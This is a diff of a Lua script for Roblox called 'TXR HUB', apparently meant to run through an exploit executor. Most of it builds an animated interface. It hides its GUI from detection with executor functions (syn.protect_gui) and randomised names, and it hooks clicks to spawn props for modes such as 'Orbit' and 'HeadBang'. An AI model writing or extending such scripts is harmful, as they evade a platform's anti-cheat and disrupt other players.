+    end) 
+end
+
+local function getActivePropData()
+    local needsChair = activeModes["Chair"]
+    local needsRobot = activeModes["Robot"] or activeModes["MultiRobot"] or activeModes["Orbit"] or activeModes["Ring"] or activeModes["HeadBang"]
+    
+    if needsChair and not needsRobot then 
+        return "FurnitureBleachers", "Furniture" 
+    else 
+        return customPropName, customPropCategory 
+    end
+end
+
+local mouse = lp:GetMouse()
+
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end 
+    
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        if not isSystemActive then return end
+        
+        local char = lp.Character
+        local tool = char and char:FindFirstChildOfClass("Tool")
+        
+        if tool and (string.find(string.lower(tool.Name), "prop") or string.find(string.lower(tool.Name), "box")) then
+            task.delay(0.25, function() 
+                if tick() - lastGameSpawnTime > 0.3 then 
+                    local propName, propCategory = getActivePropData()
+                    spawnProp(propName, propCategory) 
+                end 
+            end)
+        end
+    end
+end)
+
+-- --- GUI CONSTRUCTION ---
+local gui = Instance.new("ScreenGui", targetGuiParent)
+gui.Name = "TXR_" .. tostring(math.random(100000, 999999))
+gui.ResetOnSpawn = false
+_G.OrbitalGUI = gui
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling 
+
+pcall(function() 
+    if syn and syn.protect_gui then syn.protect_gui(gui) end
+    if protectgui then protectgui(gui) end 
+end)
+
+local aura = Instance.new("ImageLabel", gui)
+aura.AnchorPoint = Vector2.new(0.5, 0.5)
+aura.Position = UDim2.fromScale(0.5, 0.5)
+aura.Size = UDim2.new(0, 320, 0, 450)
+aura.BackgroundTransparency = 1
+aura.Image = "rbxassetid://1316045217"
+aura.ImageColor3 = Colors.Primary
+aura.ImageTransparency = 1
+aura.ZIndex = 1
+
+local auraScale = Instance.new("UIScale", aura)
+auraScale.Scale = 0.85
+
+local mainFrame = Instance.new("Frame", gui)
+mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+mainFrame.Position = UDim2.fromScale(0.5, 0.5)
+mainFrame.Size = UDim2.new(0, 280, 0, 410)
+mainFrame.BackgroundColor3 = Color3.new(1, 1, 1) 
+mainFrame.BackgroundTransparency = 1
+mainFrame.BorderSizePixel = 0
+mainFrame.ClipsDescendants = true
+mainFrame.ZIndex = 5
+
+local mainFrameCorner = Instance.new("UICorner", mainFrame)
+mainFrameCorner.CornerRadius = UDim.new(0, 14) 
+
+mainFrame:GetPropertyChangedSignal("Position"):Connect(function() 
+    aura.Position = mainFrame.Position 
+end)
+
+local bgGradient = Instance.new("UIGradient", mainFrame)
+bgGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(16, 20, 30)), 
+    ColorSequenceKeypoint.new(0.5, Colors.Background), 
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(16, 20, 30))
+})
+bgGradient.Rotation = -45
+
+local mainStroke = Instance.new("UIStroke", mainFrame)
+mainStroke.Thickness = 1.5
+mainStroke.Transparency = 1
+mainStroke.Color = Color3.new(1,1,1)
+
+local strokeGrad = Instance.new("UIGradient", mainStroke)
+strokeGrad.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Colors.Primary), 
+    ColorSequenceKeypoint.new(0.5, Colors.Purple), 
+    ColorSequenceKeypoint.new(1, Colors.Primary)
+})
+
+local mainScale = Instance.new("UIScale", mainFrame)
+mainScale.Scale = 0.85
+
+-- ✨ MATRIX RAIN
+local matrixContainer = Instance.new("Frame", mainFrame)
+matrixContainer.Size = UDim2.fromScale(1, 1)
+matrixContainer.BackgroundTransparency = 1
+matrixContainer.ZIndex = 2 
+matrixContainer.ClipsDescendants = true
+
+local matrixDrops = {}
+local matrixChars = {"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F", "Z", "X", "V", "ア", "イ", "ウ", "エ", "オ", "カ", "キ", "ク", "ケ", "コ", "サ", "シ", "ス", "セ", "ソ"}
+
+for i = 1, 55 do
+    local drop = Instance.new("TextLabel", matrixContainer)
+    drop.Size = UDim2.new(0, 20, 0, 20)
+    drop.BackgroundTransparency = 1
+    drop.Text = matrixChars[math.random(1, #matrixChars)]
+    drop.TextColor3 = Colors.Primary
+    drop.Font = Enum.Font.Code
+    drop.ZIndex = 2
+    
+    local stroke = Instance.new("UIStroke", drop)
+    stroke.Thickness = 0.6 
+    stroke.Color = Colors.PrimaryDark
+    
+    local depthLayer = math.random(1, 4) 
+    local scaleMult = 0.6 + (depthLayer * 0.15) 
+    
+    drop.TextSize = math.random(12, 15) * scaleMult
+    
+    table.insert(matrixDrops, {
+        element = drop,
+        stroke = stroke,
+        x = math.random() * 0.95,
+        y = math.random() * -1.5,
+        baseSpeed = (math.random(12, 35) / 100) * scaleMult,
+        speed = 0,
+        tickOffset = math.random(1, 10),
+        depth = depthLayer,
+        isHead = (math.random() > 0.85) 
+    })
+end
+
+local scanlines = Instance.new("ImageLabel", mainFrame)
+scanlines.Size = UDim2.new(1, 0, 2, 0) 
+scanlines.Position = UDim2.fromScale(0, -1)
+scanlines.BackgroundTransparency = 1
+scanlines.Image = "rbxassetid://7186136106" 
+scanlines.ImageColor3 = Colors.Primary
+scanlines.ImageTransparency = 0.95
+scanlines.ZIndex = 4 
+scanlines.TileSize = UDim2.new(0, 100, 0, 4)
+
+TweenService:Create(mainScale, TweenInfo.new(0.85, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
+TweenService:Create(mainFrame, TweenInfo.new(0.6, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {BackgroundTransparency = 0.1}):Play()
+TweenService:Create(mainStroke, TweenInfo.new(0.8, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Transparency = 0.2}):Play()
+TweenService:Create(auraScale, TweenInfo.new(0.85, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
+TweenService:Create(aura, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {ImageTransparency = 0.5}):Play()
+
+-- HEADER
+local header = Instance.new("Frame", mainFrame)
+header.Size = UDim2.new(1, 0, 0, 50)
+header.BackgroundTransparency = 1
+header.BorderSizePixel = 0
+header.ZIndex = 10
+
+local headerTitle = Instance.new("TextLabel", header)
+headerTitle.Size = UDim2.new(1, -90, 1, 0)
+headerTitle.Position = UDim2.fromOffset(16, 0)
+headerTitle.BackgroundTransparency = 1
+headerTitle.Text = "TXR HUB"
+headerTitle.TextColor3 = Color3.new(1,1,1)
+headerTitle.Font = Enum.Font.GothamBlack
+headerTitle.TextSize = 16
+headerTitle.TextXAlignment = Enum.TextXAlignment.Left
+headerTitle.ZIndex = 11
+
+local titleGrad = Instance.new("UIGradient", headerTitle)
+titleGrad.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Colors.Primary), 
+    ColorSequenceKeypoint.new(1, Colors.Purple)
+})
+crispText(headerTitle)
+
+local proBadge = Instance.new("Frame", header)
+proBadge.Size = UDim2.fromOffset(42, 18)
+proBadge.Position = UDim2.new(0, 95, 0.5, -9)
+proBadge.BackgroundColor3 = Colors.Primary
+proBadge.ZIndex = 11
+
+local proBadgeCorner = Instance.new("UICorner", proBadge)
+proBadgeCorner.CornerRadius = UDim.new(0, 6)
+
+local proText = Instance.new("TextLabel", proBadge)
+proText.Size = UDim2.fromScale(1, 1)
+proText.BackgroundTransparency = 1
+proText.Text = "PRO"
+proText.TextColor3 = Colors.TextDark
+proText.Font = Enum.Font.GothamBlack
+proText.TextSize = 10
+proText.ZIndex = 12
+crispText(proText)
+
+local headerDivider = Instance.new("Frame", header)
+headerDivider.Size = UDim2.new(1, 0, 0, 1)
+headerDivider.Position = UDim2.new(0, 0, 1, 0)
+headerDivider.BorderSizePixel = 0
+headerDivider.ZIndex = 15
+
+local dividerGrad = Instance.new("UIGradient", headerDivider)
+dividerGrad.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Colors.Background), 
+    ColorSequenceKeypoint.new(0.5, Colors.PrimaryDark), 
+    ColorSequenceKeypoint.new(1, Colors.Background)
+})
+
+local minimizeBtn = Instance.new("TextButton", header)
+minimizeBtn.Size = UDim2.fromOffset(28, 28)
+minimizeBtn.Position = UDim2.new(1, -70, 0.5, -14)
+minimizeBtn.BackgroundColor3 = Colors.Surface
+minimizeBtn.BackgroundTransparency = 0.5
+minimizeBtn.Text = "–"
+minimizeBtn.TextColor3 = Colors.Text
+minimizeBtn.Font = Enum.Font.GothamBold
+minimizeBtn.AutoButtonColor = false
+minimizeBtn.ZIndex = 15
+
+local minimizeCorner = Instance.new("UICorner", minimizeBtn)
+minimizeCorner.CornerRadius = UDim.new(0, 8)
+applySmartHover(minimizeBtn, nil)
+
+local closeBtn = Instance.new("TextButton", header)
+closeBtn.Size = UDim2.fromOffset(28, 28)
+closeBtn.Position = UDim2.new(1, -36, 0.5, -14)
+closeBtn.BackgroundColor3 = Colors.Surface
+closeBtn.BackgroundTransparency = 0.5
+closeBtn.Text = "×"
+closeBtn.TextColor3 = Colors.Danger
+closeBtn.Font = Enum.Font.GothamBold
+closeBtn.TextSize = 16
+closeBtn.AutoButtonColor = false
+closeBtn.ZIndex = 15
+
+local closeCorner = Instance.new("UICorner", closeBtn)
+closeCorner.CornerRadius = UDim.new(0, 8)
+applySmartHover(closeBtn, nil)
+
+-- FOOTER
+local footer = Instance.new("Frame", mainFrame)
+footer.Size = UDim2.new(1, 0, 0, 32)
+footer.Position = UDim2.new(0, 0, 1, -32)
+footer.BackgroundTransparency = 1
+footer.BorderSizePixel = 0
+footer.ZIndex = 15
+
+local discordBtn = Instance.new("TextButton", footer)
+discordBtn.Size = UDim2.fromScale(1, 1)
+discordBtn.BackgroundTransparency = 1
+discordBtn.Text = "Discord: @not_ashu."
+discordBtn.TextColor3 = Colors.SubText
+discordBtn.Font = Enum.Font.GothamMedium
+discordBtn.TextSize = 10
+discordBtn.AutoButtonColor = false
+discordBtn.ZIndex = 16
+crispText(discordBtn)
+
+discordBtn.MouseButton1Click:Connect(function() 
+    pcall(function() 
+        copyToClip("not_ashu.") 
+    end)
+    sendNotif("TXR System", "Copied to clipboard!", 2)
+    discordBtn.Text = "⚡ Copied Core!"
+    discordBtn.TextColor3 = Colors.Primary
+    task.delay(1.5, function() 
+        if discordBtn then 
+            discordBtn.Text = "Discord: @not_ashu."
+            discordBtn.TextColor3 = Colors.SubText 
+        end 
+    end) 
+end)
+
+local openBtnContainer = Instance.new("Frame", gui)
+openBtnContainer.Size = UDim2.fromOffset(86, 86) 
+openBtnContainer.AnchorPoint = Vector2.new(0.5, 0.5)
+openBtnContainer.Position = UDim2.fromScale(0.08, 0.5)
+openBtnContainer.BackgroundTransparency = 1
+openBtnContainer.Visible = false
+openBtnContainer.ZIndex = 100
+
+local coreGlow = Instance.new("ImageLabel", openBtnContainer)
+coreGlow.Size = UDim2.fromScale(1.8, 1.8)
+coreGlow.Position = UDim2.fromScale(0.5, 0.5)
+coreGlow.AnchorPoint = Vector2.new(0.5, 0.5)
+coreGlow.BackgroundTransparency = 1
+coreGlow.Image = "rbxassetid://10470601783" 
+coreGlow.ImageColor3 = Colors.Primary
+coreGlow.ImageTransparency = 0.6
+coreGlow.ZIndex = 98
+
+local coreGlowCorner = Instance.new("UICorner", coreGlow)
+coreGlowCorner.CornerRadius = UDim.new(1, 0) 
+
+local eventGlow = Instance.new("ImageLabel", openBtnContainer)
+eventGlow.Size = UDim2.fromScale(1.2, 1.2)
+eventGlow.Position = UDim2.fromScale(0.5, 0.5)
+eventGlow.AnchorPoint = Vector2.new(0.5, 0.5)
+eventGlow.BackgroundTransparency = 1
+eventGlow.Image = "rbxassetid://10470601783" 
+eventGlow.ImageColor3 = Colors.Purple
+eventGlow.ImageTransparency = 0.4
+eventGlow.ZIndex = 98
+
+local eventGlowCorner = Instance.new("UICorner", eventGlow)
+eventGlowCorner.CornerRadius = UDim.new(1, 0) 
+
+local openBtn = Instance.new("TextButton", openBtnContainer)
+openBtn.Size = UDim2.fromScale(0.85, 0.85)
+openBtn.Position = UDim2.fromScale(0.5, 0.5)
+openBtn.AnchorPoint = Vector2.new(0.5, 0.5)
+openBtn.BackgroundColor3 = Colors.Surface
+openBtn.BackgroundTransparency = 0.15
+openBtn.Text = "" 
+openBtn.AutoButtonColor = false
+openBtn.ClipsDescendants = false 
+openBtn.ZIndex = 101
+
+local openBtnCorner = Instance.new("UICorner", openBtn)
+openBtnCorner.CornerRadius = UDim.new(1, 0)
+
+local gimbalOuter = Instance.new("Frame", openBtnContainer)
+gimbalOuter.Size = UDim2.fromScale(1.05, 1.05)
+gimbalOuter.Position = UDim2.fromScale(0.5, 0.5)
+gimbalOuter.AnchorPoint = Vector2.new(0.5, 0.5)
+gimbalOuter.BackgroundTransparency = 1
+gimbalOuter.ZIndex = 99
+
+local gimbalOuterCorner = Instance.new("UICorner", gimbalOuter)
+gimbalOuterCorner.CornerRadius = UDim.new(1, 0)
+
+local goStroke = Instance.new("UIStroke", gimbalOuter)
+goStroke.Thickness = 3
+goStroke.Color = Color3.new(1,1,1)
+
+local goGrad = Instance.new("UIGradient", goStroke)
+goGrad.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Colors.Primary),
+    ColorSequenceKeypoint.new(0.25, Colors.Background),
+    ColorSequenceKeypoint.new(0.5, Colors.Purple),
+    ColorSequenceKeypoint.new(0.75, Colors.Background),
+    ColorSequenceKeypoint.new(1, Colors.Primary)
+})
+
+local openStroke = Instance.new("UIStroke", openBtn)
+openStroke.Thickness = 1.5
+openStroke.Color = Colors.Primary
+
+local gimbals = {}
+for i = 1, 4 do
+    local g = Instance.new("Frame", openBtn)
+    g.AnchorPoint = Vector2.new(0.5, 0.5)
+    g.Position = UDim2.fromScale(0.5, 0.5)
+    g.BackgroundTransparency = 1
+    g.ZIndex = 102
+    
+    local gCorner = Instance.new("UICorner", g)
+    gCorner.CornerRadius = UDim.new(1, 0)
+    
+    local gs = Instance.new("UIStroke", g)
+    gs.Color = (i%2==0) and Colors.Primary or Colors.Purple
+    gs.Thickness = 1.2
+    table.insert(gimbals, {frame = g, stroke = gs})
+end
+
+local diamonds = {}
+for i = 1, 4 do
+    local d = Instance.new("Frame", openBtn)
+    d.Size = UDim2.fromOffset(26, 26)
+    d.Position = UDim2.fromScale(0.5, 0.5)
+    d.AnchorPoint = Vector2.new(0.5, 0.5)
+    d.BackgroundColor3 = Colors.Background
+    d.BackgroundTransparency = 0.5
+    d.ZIndex = 103
+    
+    local ds = Instance.new("UIStroke", d)
+    ds.Color = (i%2==0) and Colors.Primary or Colors.Purple
+    ds.Thickness = 1.5
+    table.insert(diamonds, {frame = d, stroke = ds})
+end
+
+local crosshair = Instance.new("ImageLabel", openBtn)
+crosshair.Size = UDim2.fromScale(0.65, 0.65)
+crosshair.Position = UDim2.fromScale(0.5, 0.5)
+crosshair.AnchorPoint = Vector2.new(0.5, 0.5)
+crosshair.BackgroundTransparency = 1
+crosshair.Image = "rbxassetid://13110903323" 
+crosshair.ImageColor3 = Colors.Primary
+crosshair.ImageTransparency = 0.2
+crosshair.ZIndex = 104
+
+local centerCore = Instance.new("Frame", openBtn)
+centerCore.Size = UDim2.fromOffset(10, 10)
+centerCore.Position = UDim2.fromScale(0.5, 0.5)
+centerCore.AnchorPoint = Vector2.new(0.5, 0.5)
+centerCore.BackgroundColor3 = Colors.Primary
+centerCore.BackgroundTransparency = 0.1
+centerCore.ZIndex = 106
+
+local centerCoreCorner = Instance.new("UICorner", centerCore)
+centerCoreCorner.CornerRadius = UDim.new(1, 0)
+
+local coreStroke = Instance.new("UIStroke", centerCore)
+coreStroke.Thickness = 2
+coreStroke.Color = Color3.new(1,1,1)
+
+local orbs = {}
+for i=1, 12 do
+    local orb = Instance.new("Frame", openBtn)
+    orb.Size = UDim2.fromOffset(5, 5)
+    orb.BackgroundColor3 = Colors.Primary
+    orb.ZIndex = 105
+    
+    local orbCorner = Instance.new("UICorner", orb)
+    orbCorner.CornerRadius = UDim.new(1, 0)
+    
+    table.insert(orbs, orb)
+end
+
+local orbHovered = false
+local baseOrbScale = UDim2.fromScale(0.85, 0.85)
+local baseCenterPos = UDim2.fromScale(0.5, 0.5)
+local isDraggingOrb = false
+local dragThresholdMet = false
+
+openBtn.MouseEnter:Connect(function() 
+    orbHovered = true 
+end)
+
+openBtn.MouseLeave:Connect(function() 
+    orbHovered = false 
+end)
+
+local function spawnSonar(pulseColor)
+    if not openBtnContainer.Visible then 
+        return 
+    end 
+    
+    local ring = Instance.new("Frame", openBtn)
+    ring.Size = UDim2.fromOffset(12, 12)
+    ring.Position = UDim2.fromScale(0.5, 0.5)
+    ring.AnchorPoint = Vector2.new(0.5, 0.5)
+    ring.BackgroundTransparency = 1
+    ring.ZIndex = 101
+    
+    local ringCorner = Instance.new("UICorner", ring)
+    ringCorner.CornerRadius = UDim.new(1, 0)
+    
+    local rs = Instance.new("UIStroke", ring)
+    rs.Color = pulseColor
+    rs.Thickness = 2
+    rs.Transparency = 0
+    
+    local pulseSpeed = isSystemActive and 0.8 or 1.2
+    
+    local ringTween = TweenService:Create(ring, TweenInfo.new(pulseSpeed, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Size = UDim2.fromOffset(105, 105)})
+    ringTween:Play()
+    
+    local rsTween = TweenService:Create(rs, TweenInfo.new(pulseSpeed, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Transparency = 1})
+    rsTween:Play()
+    
+    task.delay(pulseSpeed, function() 
+        pcall(function() 
+            ring:Destroy() 
+        end) 
+    end)
+end
+
+-- ✨ 🛑 ONYX EXIT MODAL 🛑 ✨
+local closeOverlay = Instance.new("Frame", mainFrame)
+closeOverlay.Size = UDim2.fromScale(1, 1)
+closeOverlay.BackgroundColor3 = Color3.new(0, 0, 0)
+closeOverlay.BackgroundTransparency = 1
+closeOverlay.ZIndex = 50
+closeOverlay.Visible = false
+
+local closeModal = Instance.new("Frame", closeOverlay)
+closeModal.Size = UDim2.fromScale(0.85, 0.4)
+closeModal.AnchorPoint = Vector2.new(0.5, 0.5)
+closeModal.Position = UDim2.fromScale(0.5, 0.5)
+closeModal.BackgroundColor3 = Colors.Background
+closeModal.BackgroundTransparency = 0.1
+closeModal.ClipsDescendants = true
+closeModal.ZIndex = 51
+
+local cmCorner = Instance.new("UICorner", closeModal)
+cmCorner.CornerRadius = UDim.new(0, 14)
+
+local cmStroke = Instance.new("UIStroke", closeModal)
+cmStroke.Color = Colors.Primary
+cmStroke.Thickness = 2
+cmStroke.Transparency = 0.5
+
+local cmGrad = Instance.new("UIGradient", cmStroke)
+cmGrad.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Colors.Primary),
+    ColorSequenceKeypoint.new(0.5, Colors.Purple),
+    ColorSequenceKeypoint.new(1, Colors.Primary)
+})
+
+local cmTitle = Instance.new("TextLabel", closeModal)
+cmTitle.Size = UDim2.new(1, 0, 0, 40)
+cmTitle.Position = UDim2.fromOffset(0, 10)
+cmTitle.BackgroundTransparency = 1
+cmTitle.Text = "SYSTEM HALT"
+cmTitle.TextColor3 = Color3.new(1,1,1)
+cmTitle.Font = Enum.Font.GothamBlack
+cmTitle.TextSize = 16
+cmTitle.ZIndex = 52
+crispText(cmTitle)
+
+local cmSub = Instance.new("TextLabel", closeModal)
+cmSub.Size = UDim2.new(1, -40, 0, 40)
+cmSub.Position = UDim2.new(0, 20, 0, 50)
+cmSub.BackgroundTransparency = 1
+cmSub.Text = "Terminate Quantum Core and halt all active processes?"
+cmSub.TextColor3 = Colors.SubText
+cmSub.Font = Enum.Font.GothamMedium
+cmSub.TextSize = 12
+cmSub.TextWrapped = true
+cmSub.ZIndex = 52
+
+local buttonContainer = Instance.new("Frame", closeModal)
+buttonContainer.Size = UDim2.new(1, -20, 0, 40)
+buttonContainer.Position = UDim2.new(0, 10, 1, -50)
+buttonContainer.BackgroundTransparency = 1
+buttonContainer.ZIndex = 52
+
+local cmCancel = Instance.new("TextButton", buttonContainer)
+cmCancel.Size = UDim2.new(0.48, 0, 1, 0)
+cmCancel.Position = UDim2.fromScale(0, 0)
+cmCancel.BackgroundColor3 = Colors.Surface
+cmCancel.BackgroundTransparency = 0.5
+cmCancel.Text = "RETURN"
+cmCancel.TextColor3 = Colors.Primary
+cmCancel.Font = Enum.Font.GothamBold
+cmCancel.TextSize = 12
+cmCancel.AutoButtonColor = false
+cmCancel.ZIndex = 53
+local cnlCorner = Instance.new("UICorner", cmCancel)
+cnlCorner.CornerRadius = UDim.new(0, 8)
+local cnlStroke = Instance.new("UIStroke", cmCancel)
+cnlStroke.Color = Colors.Primary
+cnlStroke.Transparency = 0.5
+
+local cmConfirm = Instance.new("TextButton", buttonContainer)
+cmConfirm.Size = UDim2.new(0.48, 0, 1, 0)
+cmConfirm.Position = UDim2.fromScale(0.52, 0)
+cmConfirm.BackgroundColor3 = Colors.Danger
+cmConfirm.BackgroundTransparency = 0.2
+cmConfirm.Text = "TERMINATE"
+cmConfirm.TextColor3 = Color3.new(1,1,1)
+cmConfirm.Font = Enum.Font.GothamBlack
+cmConfirm.TextSize = 12
+cmConfirm.AutoButtonColor = false
+cmConfirm.ZIndex = 53
+local cfmCorner = Instance.new("UICorner", cmConfirm)
+cfmCorner.CornerRadius = UDim.new(0, 8)
+
+applySmartHover(cmConfirm, nil)
+applySmartHover(cmCancel, nil)
+
+task.spawn(function()
+    local t = 0
+    local sonarTimer = 0
+    local currentSpeedMod = 1
+    local currentRadiusMod = 1
+    local currentFocus = 0 
+    
+    RunService.RenderStepped:Connect(function(dt)
+        if _G.TXR_InstanceID ~= currentExecutionID then 
+            return 
+        end 
+        
+        if not gui.Parent then 
+            return 
+        end 
+        
+        t = t + dt
+        
+        if mainFrame.Visible then
+            local rot = (t * 40) % 360
+            strokeGrad.Rotation = rot
+            bgGradient.Rotation = (rot/2) - 45
+            cmGrad.Rotation = rot
+            
+            local breath = (math.sin(t * 3) + 1) / 2 
+            aura.ImageTransparency = 0.45 + (breath * 0.15)
+            mainStroke.Transparency = 0.15 + (breath * 0.2)
+            titleGrad.Offset = Vector2.new(math.sin(t * 2) * 0.3, 0)
+            scanlines.Position = UDim2.new(0, 0, (t * 0.08) % 1 - 1, 0)
+
+            local targetFocus = isSubMenuOpen and 0.85 or (uiHoverCount > 0 and 0.45 or 0)
+            currentFocus = currentFocus + (targetFocus - currentFocus) * dt * 6
+            local timeScale = 1 - (currentFocus * 0.75) 
+
+            for i, drop in ipairs(matrixDrops) do
+                drop.speed = drop.baseSpeed + (math.sin(t * 2 + drop.tickOffset) * 0.05)
+                drop.y = drop.y + (drop.speed * timeScale * dt)
+                
+                local drift = math.sin(t * 1.5 + drop.tickOffset) * 0.005 * (drop.depth / 5) * timeScale
+                
+                if drop.y > 1.1 then
+                    drop.y = math.random() * -0.5
+                    drop.x = math.random() * 0.95
+                    drop.isHead = (math.random() > 0.85) 
+                end
+                
+                drop.element.Position = UDim2.fromScale(drop.x + drift, drop.y)
+                
+                if math.floor(t * (12 * timeScale) + drop.tickOffset) % 4 == 0 then
+                    drop.element.Text = matrixChars[math.random(1, #matrixChars)]
+                end
+                
+                local fade = math.clamp((drop.y - 0.2) / 0.7, 0, 1)
+                local baseDepthFade = (3 - drop.depth) * 0.25 
+                local focusFade = currentFocus * 0.6 
+                local focusBlur = currentFocus * (drop.depth * 0.2) 
+                local totalBaseTrans = baseDepthFade + focusFade + focusBlur
+                
+                if drop.isHead and drop.y < 0.8 then
+                    local headGlow = math.clamp(drop.y * 2.5, 0, 1)
+                    local headColor = Color3.new(0.85, 1, 1):Lerp(Colors.Primary, headGlow + (currentFocus * 0.5))
+                    drop.element.TextColor3 = headColor
+                    drop.stroke.Color = Colors.Primary:Lerp(Colors.PrimaryDark, headGlow)
+                    
+                    drop.element.TextTransparency = math.clamp(0.1 + totalBaseTrans + (fade * 0.4), 0, 1)
+                    drop.stroke.Transparency = math.clamp(0.2 + totalBaseTrans + (fade * 0.4), 0, 1)
+                else
+                    drop.element.TextColor3 = Colors.Primary
+                    drop.stroke.Color = Colors.PrimaryDark
+                    
+                    drop.element.TextTransparency = math.clamp(0.3 + totalBaseTrans + (fade * 0.6), 0, 1)
+                    drop.stroke.Transparency = math.clamp(0.5 + totalBaseTrans + (fade * 0.4), 0, 1)
+                end
+            end
+        end
+        
+        if openBtnContainer.Visible then
+            local targetSpeed = isSystemActive and 3 or 1
+            if orbHovered then targetSpeed = targetSpeed * 1.5 end
+            
+            currentSpeedMod = currentSpeedMod + (targetSpeed - currentSpeedMod) * dt * 5
+            local targetRadius = orbHovered and 0.6 or 1
+            currentRadiusMod = currentRadiusMod + (targetRadius - currentRadiusMod) * dt * 8
+            local activeT = t * 3 * currentSpeedMod
+            
+            local baseColor1 = isSystemActive and Colors.Danger or Colors.Primary
+            local baseColor2 = isSystemActive and Colors.Warning or Colors.Purple
+            local lerpAlpha = (math.sin(activeT * 0.8) + 1) / 2
+            
+            coreGlow.ImageColor3 = baseColor1:Lerp(baseColor2, lerpAlpha)
+            coreGlow.ImageTransparency = 0.4 + (math.sin(activeT) * 0.25)
+            eventGlow.ImageColor3 = baseColor2:Lerp(Color3.new(1,1,1), lerpAlpha)
+            
+            openStroke.Color = baseColor1:Lerp(baseColor2, lerpAlpha)
+            goGrad.Rotation = (activeT * 50) % 360
+            goStroke.Transparency = orbHovered and 0.1 or 0.5
+            
+            local gPulse = 40 + (math.sin(activeT * 2) * 3)
+            gimbals[1].frame.Size = UDim2.fromOffset(gPulse * math.abs(math.cos(activeT * 0.8)), gPulse)
+            gimbals[1].frame.Rotation = (activeT * 20) % 360
+            gimbals[1].stroke.Color = baseColor1
+            
+            gimbals[2].frame.Size = UDim2.fromOffset(gPulse, gPulse * math.abs(math.sin(activeT * 0.9)))
+            gimbals[2].frame.Rotation = -(activeT * 25) % 360
+            gimbals[2].stroke.Color = baseColor2
+            
+            gimbals[3].frame.Size = UDim2.fromOffset(gPulse * math.abs(math.cos(activeT * 1.1)), gPulse)
+            gimbals[3].frame.Rotation = 45 + (activeT * 15) % 360
+            gimbals[3].stroke.Color = baseColor1:Lerp(Color3.new(1,1,1), 0.5)
+            
+            gimbals[4].frame.Size = UDim2.fromOffset(gPulse, gPulse * math.abs(math.sin(activeT * 1.2)))
+            gimbals[4].frame.Rotation = -45 - (activeT * 15) % 360
+            gimbals[4].stroke.Color = baseColor2:Lerp(Color3.new(1,1,1), 0.5)
+            
+            for i, d in ipairs(diamonds) do
+                local breath = math.sin(activeT * 2 + (i * math.pi/2)) * 4
+                d.frame.Size = UDim2.fromOffset(24 + breath, 24 - breath)
+                d.frame.Rotation = (activeT * 40) * (i%2==0 and 1 or -1) + (i * 22.5)
+                d.stroke.Color = (i%2==0) and baseColor1 or baseColor2
+            end
+            
+            crosshair.Rotation = -(activeT * 60) % 360
+            crosshair.ImageColor3 = baseColor1
+            
+            centerCore.BackgroundColor3 = baseColor1:Lerp(Color3.new(1,1,1), lerpAlpha * 0.5)
+            coreStroke.Color = baseColor2
+
+            local rBase = 32 * currentRadiusMod
+            for i = 1, 12 do
+                local offset = (i - 1) * (math.pi * 2 / 4)
+                local orb = orbs[i]
+                if i <= 4 then
+                    local a = activeT * 1.5 + offset
+                    local depth = math.sin(a)
+                    orb.Position = UDim2.new(0.5, math.cos(a) * rBase, 0.5, depth * (rBase * 0.2))
+                    orb.Size = UDim2.fromOffset(3.5 + (depth * 2.5), 3.5 + (depth * 2.5))
+                    orb.ZIndex = depth > 0 and 106 or 102
+                    orb.BackgroundColor3 = baseColor1
+                elseif i <= 8 then
+                    local a = -activeT * 1.8 + offset
+                    local depth = math.cos(a)
+                    orb.Position = UDim2.new(0.5, math.cos(a) * (rBase * 0.2), 0.5, math.sin(a) * rBase)
+                    orb.Size = UDim2.fromOffset(3.5 + (depth * 2.5), 3.5 + (depth * 2.5))
+                    orb.ZIndex = depth > 0 and 106 or 102
+                    orb.BackgroundColor3 = baseColor2
+                else
+                    local a = activeT * 2.5 + offset
+                    local depth = math.sin(a + math.pi/4)
+                    orb.Position = UDim2.new(0.5, math.sin(a) * rBase, 0.5, math.sin(a * 2) * (rBase * 0.5))
+                    orb.Size = UDim2.fromOffset(4 + (depth * 2), 4 + (depth * 2))
+                    orb.ZIndex = 107 
+                    orb.BackgroundColor3 = Color3.new(1,1,1)
+                end
+            end
+
+            local mouseLoc = UserInputService:GetMouseLocation()
+            local btnAbsCenter = openBtnContainer.AbsolutePosition + (openBtnContainer.AbsoluteSize / 2)
+            local mPos = Vector2.new(mouseLoc.X, mouseLoc.Y)
+            local mDist = (mPos - btnAbsCenter).Magnitude
+            local magneticRadius = 150
+
+            if orbHovered and mDist < magneticRadius and not isDraggingOrb then
+                local pullStr = 1 - (mDist / magneticRadius)
+                local offsetX = (mPos.X - btnAbsCenter.X) * 0.25 * pullStr
+                local offsetY = (mPos.Y - btnAbsCenter.Y) * 0.25 * pullStr
+                local stretchX = 0.85 + (math.abs(offsetX) / 200)
+                local stretchY = 0.85 + (math.abs(offsetY) / 200)
+
+                openBtn.Size = openBtn.Size:Lerp(UDim2.fromScale(stretchX, stretchY), dt * 12)
+                openBtn.Position = openBtn.Position:Lerp(UDim2.new(0.5, offsetX, 0.5, offsetY), dt * 10)
+                eventGlow.Position = eventGlow.Position:Lerp(UDim2.new(0.5, offsetX * 0.4, 0.5, offsetY * 0.4), dt * 10)
+                crosshair.Position = crosshair.Position:Lerp(UDim2.new(0.5, offsetX * 0.7, 0.5, offsetY * 0.7), dt * 12)
+                centerCore.Position = centerCore.Position:Lerp(UDim2.new(0.5, offsetX * 1.2, 0.5, offsetY * 1.2), dt * 15)
+                
